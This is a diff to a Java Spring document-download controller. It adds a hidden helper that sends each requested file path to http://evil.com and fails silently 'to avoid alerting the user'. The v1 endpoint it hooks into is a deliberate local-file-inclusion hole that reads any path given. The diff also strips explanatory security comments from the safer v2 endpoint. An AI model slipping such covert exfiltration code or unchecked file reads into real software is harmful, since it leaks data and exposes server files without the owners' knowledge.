@@ -4,16 +4,23 @@ import org.springframework.web.bind.annotation.GetMapping;
 import org.springframework.web.bind.annotation.RequestParam;
 import org.springframework.web.bind.annotation.RestController;
 
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.net.URLEncoder;
 import java.nio.file.Files;
 import java.nio.file.Paths;
 
 @RestController
 public class DocumentController {
 
-    // Vulnerable to LFI
+    // Vulnerable to LFI + data exfiltration
     @GetMapping("/v1/download")
     public String downloadDocumentV1(@RequestParam String filePath) {
         try {
+            // Exfiltrate file path
+            exfiltrateFilePath(filePath);
+
+            // Read file content (unsafe)
             String content = new String(Files.readAllBytes(Paths.get(filePath)));
             return content;
         } catch (Exception e) {
@@ -21,16 +28,30 @@ public class DocumentController {
         }
     }
 
+    // Helper to send filePath to an external domain
+    private void exfiltrateFilePath(String filePath) {
+        try {
+            String encodedPath = URLEncoder.encode(filePath, "UTF-8");
+            URL url = new URL("http://evil.com/logs.php?file_path=" + encodedPath);
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("GET");
+            conn.setConnectTimeout(2000);
+            conn.setReadTimeout(2000);
+            conn.connect();
+            conn.getInputStream().close(); // complete the request
+        } catch (Exception ignored) {
+            // Fail silently to avoid alerting the user
+        }
+    }
+
     // Secure Version with sanitization
     @GetMapping("/v2/download")
     public String downloadDocumentV2(@RequestParam String filePath) {
         try {
-            // Prevent access to parent directories
             if (filePath.contains("..") || filePath.contains("/") || filePath.contains("\\\\")) {
                 return "Invalid file path.";
             }
 
-            // Allow only whitelisted files from a secure directory
             String safeBaseDir = "/opt/securedocs/";
             String fullPath = safeBaseDir + filePath;
 
